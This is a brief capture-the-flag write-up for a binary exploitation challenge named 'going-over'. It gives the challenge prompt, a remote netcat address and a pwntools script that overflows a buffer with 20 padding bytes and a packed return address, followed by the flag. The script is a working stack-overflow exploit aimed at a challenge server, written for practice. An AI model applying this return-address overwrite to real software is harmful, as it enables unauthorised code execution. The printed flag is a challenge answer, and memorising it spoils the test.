## going-over

### Challenge Description  


- My friends said they were going on a trip but I think they ran into some trouble...  
- They sent me these two files before we lost contact (src.c and going-over)  
- nc 0.cloud.chals.io 10197  

### Writeup
This is pwn.    
```python
import pwn
from pwn import *
p = remote("0.cloud.chals.io", 10197)
payload = 'A' * 20 + pwn.p64(0x00000000004011b6)

p.sendline(payload)
print(p.recvline())
p.interactive()

# jctf{ph3w_ju57_1n_71m3}
```